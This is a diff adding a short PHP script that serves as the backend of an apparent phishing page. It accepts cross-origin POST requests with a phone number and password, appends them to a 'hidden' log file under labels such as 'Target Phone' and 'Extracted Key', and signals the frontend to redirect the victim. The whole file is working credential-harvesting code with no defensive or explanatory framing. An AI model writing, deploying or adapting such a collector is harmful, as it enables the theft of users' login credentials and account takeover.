@@ -1,0 +1,35 @@
+
+<?php
+header("Access-Control-Allow-Origin: *");
+header("Content-Type: application/json");
+
+// Process incoming network data strings only via POST operations
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    
+    // Snatch data pipeline packets
+    $rawPayload = file_get_contents('php://input');
+    $decodedData = json_decode($rawPayload, true);
+
+    if ($decodedData) {
+        $userPhone = $decodedData['phone'] ?? 'N/A';
+        $userPassword = $decodedData['password'] ?? 'N/A';
+        $timeRecorded = $decodedData['timestamp'] ?? 'N/A';
+
+        // Structure a readable ledger entry string
+        $logEntry = "[" . $timeRecorded . "] Target Phone: " . $userPhone . " | Extracted Key: " . $userPassword . PHP_EOL;
+
+        // Write content to a hidden text ledger automatically
+        // Make sure your web server has write access permissions inside this directory
+        file_put_contents('admin_logs.txt', $logEntry, FILE_APPEND);
+
+        // Signal frontend structure to perform redirection sequence
+        echo json_encode(["status" => "success", "message" => "Logged successfully."]);
+    } else {
+        http_response_code(400);
+        echo json_encode(["status" => "error", "message" => "Payload structural damage."]);
+    }
+} else {
+    http_response_code(405);
+    echo json_encode(["status" => "error", "message" => "Method disallowed."]);
+}
+?>
